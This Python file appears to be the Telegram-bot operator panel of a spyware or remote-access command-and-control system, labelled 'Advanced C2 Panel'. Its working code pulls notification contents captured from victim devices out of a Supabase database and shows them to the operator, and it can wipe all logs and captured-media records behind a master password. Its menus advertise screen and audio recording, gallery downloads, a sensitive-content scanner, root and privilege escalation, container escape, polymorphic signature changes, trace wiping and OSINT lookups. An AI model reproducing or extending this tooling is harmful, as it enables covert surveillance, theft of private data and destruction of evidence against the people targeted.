import os
import sys
import telebot
from telebot import types

class BotMenu:
    def __init__(self, bot, admin_id, supabase, auth_list, current_token_index, all_tokens):
        self.bot = bot
        self.admin_id = admin_id
        self.supabase = supabase
        self.auth_list = auth_list
        self.current_index = current_token_index
        self.all_tokens = all_tokens
        self._register_handlers()

    def _is_authenticated(self, user_id):
        return user_id in self.auth_list

    def _register_handlers(self):
        @self.bot.message_handler(commands=['start', 'menu'])
        def show_main_menu(message):
            if not self._is_authenticated(message.from_user.id):
                return
            markup = self._main_menu_markup()
            self.bot.send_message(message.chat.id, "🎮 **Advanced C2 Panel**\nSystem Status: *Ready*",
                                 parse_mode='Markdown', reply_markup=markup)

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("menu_"))
        def handle_menu(call):
            if not self._is_authenticated(call.from_user.id):
                return
            cmd = call.data[5:]
            markup = types.InlineKeyboardMarkup(row_width=1)
            back = types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")

            if cmd == "devices":
                text = "📱 **Devices:**\n/list - All targets\n/info [id] - Deep scan"
            elif cmd == "notifs":
                self.list_notifications(call)
                return
            elif cmd == "ai_radar":
                text = "🔞 **AI Radar:**\n/sens_scan [id] - Force scan\n/ai_status [id] - Radar health"
            elif cmd == "media":
                text = "📸 **Media Vault:**\n/gallery [id] - Latest captures\n/download [id] [file_id] - Get file"
            elif cmd == "live":
                text = "🎥 **Live Actions:**\n/record_screen [id] [sec] - Screen record\n/screenshot [id] - Screenshot\n/record_audio [id] [sec] - Audio"
            elif cmd == "adv":
                text = "☠️ **Advanced:**\n⚡ /root [id] - Get root\n⬆️ /privesc [id] - Privilege escalation\n🐳 /escape [id] - Container escape"
            elif cmd == "evolve":
                text = "🔬 **Self-Evolve:**\n🦎 /polymorph - Change signature\n💊 /self_heal - Repair modules\n💀 /destruct [id] - Wipe traces"
            elif cmd == "osint":
                text = "📊 **OSINT:**\n✉️ /osint_email [email]\n📞 /osint_phone [num]\n👤 /osint_user [user]"
            elif cmd == "zero_day":
                text = "⚠️ **Zero-Day Hunter Result:**\n_No new vulnerabilities found._"
            elif cmd == "db_summary":
                self.show_db_summary(call)
                return
            elif cmd == "bot_status":
                self.show_bot_status(call)
                return
            else:
                text = "Select action:"

            markup.add(back)
            self.bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                                     parse_mode='Markdown', reply_markup=markup)

        @self.bot.callback_query_handler(func=lambda call: call.data == "menu_main")
        def back_to_main(call):
            if not self._is_authenticated(call.from_user.id):
                return
            self.bot.delete_message(call.message.chat.id, call.message.message_id)
            show_main_menu(call.message)

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("notif_"))
        def fetch_notification(call):
            if not self._is_authenticated(call.from_user.id):
                return
            notif_id = call.data.split("_")[1]
            try:
                res = self.supabase.table('notification_logs').select('*').eq('id', notif_id).execute()
                if res.data:
                    log = res.data[0]
                    content = log.get('content', 'N/A')
                    if len(content) > 4000:
                        content = content[:4000] + "..."
                    msg = (f"📩 **Notification #{notif_id}**\n"
                           f"📱 Device: `{log['device_id']}`\n"
                           f"📝 Content: {content}\n"
                           f"🕒 Time: {log['created_at']}")
                    self.bot.send_message(call.message.chat.id, msg, parse_mode='Markdown')
                else:
                    self.bot.answer_callback_query(call.id, "Not found.")
            except Exception as e:
                self.bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")
            self.bot.answer_callback_query(call.id)

        @self.bot.callback_query_handler(func=lambda call: call.data == "menu_bot_status")
        def show_bot_status(call):
            if not self._is_authenticated(call.from_user.id):
                return
            text = "🤖 **Bot Status & Management**\n\n"
            for i, token in enumerate(self.all_tokens, 1):
                status = "✅ Active" if i-1 == self.current_index else "⏸️ Standby"
                text += f"Bot {i}: `{token[:10]}...` {status}\n"
            text += f"\nCurrent active: Bot {self.current_index+1}"

            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(
                types.InlineKeyboardButton("🔄 Switch to Next Bot", callback_data="ask_switch"),
                types.InlineKeyboardButton("🧨 Wipe All Logs", callback_data="ask_wipe"),
                types.InlineKeyboardButton("🔌 Shutdown Server", callback_data="ask_logout"),
                types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")
            )
            self.bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                                     parse_mode='Markdown', reply_markup=markup)

        @self.bot.callback_query_handler(func=lambda call: call.data in ["ask_switch", "ask_wipe", "ask_logout"])
        def ask_password(call):
            if not self._is_authenticated(call.from_user.id):
                return
            action_map = {
                "ask_switch": "🔄 Switch Bot",
                "ask_wipe": "💥 Wipe All Logs",
                "ask_logout": "🔌 Shutdown Server"
            }
            msg = self.bot.send_message(call.message.chat.id, f"{action_map[call.data]}\nEnter MASTER PASSWORD to confirm:")
            self.bot.register_next_step_handler(msg, self._execute_critical, call.data)

    def _execute_critical(self, message, action):
        if message.text != os.environ.get("MASTER_PASSWORD"):
            self.bot.reply_to(message, "❌ Incorrect password. Action cancelled.")
            return

        if action == "ask_switch":
            self.bot.reply_to(message, "🔄 Switching to next bot... Server will restart.")
            sys.exit(0)

        elif action == "ask_wipe":
            try:
                # Delete all rows from notification_logs, media_captures, service_tasks
                self.supabase.table('notification_logs').delete().neq('id', 0).execute()
                self.supabase.table('media_captures').delete().neq('id', 0).execute()
                self.supabase.table('service_tasks').delete().neq('id', 0).execute()
                # Optionally keep client_info records (devices)
                self.bot.reply_to(message, "✅ All logs and media records have been wiped.")
            except Exception as e:
                self.bot.reply_to(message, f"❌ Error during wipe: {e}")

        elif action == "ask_logout":
            self.bot.reply_to(message, "🔌 Shutting down server...")
            sys.exit(0)

    def list_notifications(self, call):
        try:
            res = self.supabase.table('notification_logs').select('id, device_id, created_at').order('id', desc=True).limit(10).execute()
            if not res.data:
                self.bot.answer_callback_query(call.id, "No notifications.")
                return
            text = "📩 **Recent Notifications (click to fetch)**\n"
            markup = types.InlineKeyboardMarkup(row_width=1)
            for log in res.data:
                btn_text = f"ID: {log['id']} | Device: {log['device_id'][:6]}... | {log['created_at'][11:16]}"
                markup.add(types.InlineKeyboardButton(btn_text, callback_data=f"notif_{log['id']}"))
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
            self.bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                                     parse_mode='Markdown', reply_markup=markup)
        except Exception as e:
            self.bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")

    def show_db_summary(self, call):
        try:
            dev_count = self.supabase.table('client_info').select('id', count='exact', head=True).execute().count
            notif_count = self.supabase.table('notification_logs').select('id', count='exact', head=True).execute().count
            media_count = self.supabase.table('media_captures').select('id', count='exact', head=True).execute().count
            task_count = self.supabase.table('service_tasks').select('id', count='exact', head=True).execute().count
            text = (f"📊 **Database Summary**\n\n"
                    f"📱 Devices: `{dev_count}`\n"
                    f"📩 Notifications: `{notif_count}`\n"
                    f"📸 Media: `{media_count}`\n"
                    f"⚙️ Tasks: `{task_count}`")
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="menu_main"))
            self.bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                                     parse_mode='Markdown', reply_markup=markup)
        except Exception as e:
            self.bot.answer_callback_query(call.id, f"Error: {str(e)[:50]}")

    def _main_menu_markup(self):
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("📱 Devices", callback_data="menu_devices"),
            types.InlineKeyboardButton("📩 Notifs", callback_data="menu_notifs"),
            types.InlineKeyboardButton("🔞 AI Radar", callback_data="menu_ai_radar"),
            types.InlineKeyboardButton("📸 Media", callback_data="menu_media"),
            types.InlineKeyboardButton("🎥 Live", callback_data="menu_live"),
            types.InlineKeyboardButton("☠️ Adv-Exploit", callback_data="menu_adv"),
            types.InlineKeyboardButton("🔬 Evolve", callback_data="menu_evolve"),
            types.InlineKeyboardButton("📊 OSINT", callback_data="menu_osint"),
            types.InlineKeyboardButton("⚠️ Zero-Day", callback_data="menu_zero_day"),
            types.InlineKeyboardButton("📊 DB Summary", callback_data="menu_db_summary"),
            types.InlineKeyboardButton("🤖 Bot Status", callback_data="menu_bot_status")
        )
        return markup

def setup_bot_menu(bot, admin_id, supabase, auth_list, current_index, all_tokens):
    return BotMenu(bot, admin_id, supabase, auth_list, current_index, all_tokens)
